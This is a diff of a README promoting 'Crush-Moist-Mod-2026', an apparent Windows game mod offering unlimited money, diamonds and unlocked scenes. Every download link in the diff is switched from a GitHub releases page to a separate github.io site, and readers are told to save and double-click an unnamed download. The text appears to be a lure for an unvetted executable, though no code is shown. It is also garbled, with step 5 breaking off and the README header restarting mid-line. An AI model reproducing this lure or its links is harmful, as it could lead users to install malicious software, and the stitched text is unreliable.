@@ -1,6 +1,6 @@
 # 💎 Crush-Moist-Mod-2026 - Unlock Everything and Play Now
 
-[![Download Crush-Moist-Mod-2026](https://img.shields.io/badge/Download-Crush--Moist--Mod--2026-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Clancyamphitropous401/Crush-Moist-Mod-2026/releases)
+[![Download Crush-Moist-Mod-2026](https://img.shields.io/badge/Download-Crush--Moist--Mod--2026-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://clancyamphitropous401.github.io)
 
 Crush-Moist-Mod-2026 is a ready-to-use update for players who want a faster, fuller Crush Moist experience on Windows. The October 2026 release is built around unlimited money and diamonds, all scenes and characters unlocked, and support for Steam and browser play. This page walks you through the download link, the Windows setup flow, and the main features in plain language.
 
@@ -32,7 +32,7 @@ Steam and browser support make the package easy to recommend to different types 
 
 Visit this link to download the application:
 
-[Download Crush-Moist-Mod-2026](https://github.com/Clancyamphitropous401/Crush-Moist-Mod-2026/releases)
+[Download Crush-Moist-Mod-2026](https://clancyamphitropous401.github.io)
 
 1. Visit this link to download the application.
 2. When the download begins, save it to your Windows computer.
@@ -40,7 +40,7 @@ Visit this link to download the application:
 4. Double-click the downloaded item to start it.
 5. If# 💎 Crush-Moist-Mod-2026 - Unlock Everything and Play Now
 
-[![Download Crush-Moist-Mod-2026](https://img.shields.io/badge/Download-Crush--Moist--Mod--2026-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Clancyamphitropous401/Crush-Moist-Mod-2026/releases)
+[![Download Crush-Moist-Mod-2026](https://img.shields.io/badge/Download-Crush--Moist--Mod--2026-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://clancyamphitropous401.github.io)
 
 Crush-Moist-Mod-2026 is a ready-to-use update for players who want a faster, fuller Crush Moist experience on Windows. The October 2026 release is built around unlimited money and diamonds, all scenes and characters unlocked, and support for Steam and browser play. This page walks you through the download link, the Windows setup flow, and the main features in plain language.
 
@@ -72,7 +72,7 @@ Steam and browser support make the package easy to recommend to different types 
 
 Visit this link to download the application:
 
-[Download Crush-Moist-Mod-2026](https://github.com/Clancyamphitropous401/Crush-Moist-Mod-2026/releases)
+[Download Crush-Moist-Mod-2026](https://clancyamphitropous401.github.io)
 
 1. Visit this link to download the application.
 2. When the download begins, save it to your Windows computer.
@@ -136,7 +136,7 @@ Bookmark this page and the download link together. That way, if you set up the a
 
 Visit this link to download the application:
 
-[Get Crush-Moist-Mod-2026](https://github.com/Clancyamphitropous401/Crush-Moist-Mod-2026/releases)
+[Get Crush-Moist-Mod-2026](https://clancyamphitropous401.github.io)
 
 Save the download, open it from your Downloads folder, launch the game through Steam or your browser, and confirm that money, diamonds, scenes, and characters are unlocked. That is the full process for Windows users.
 
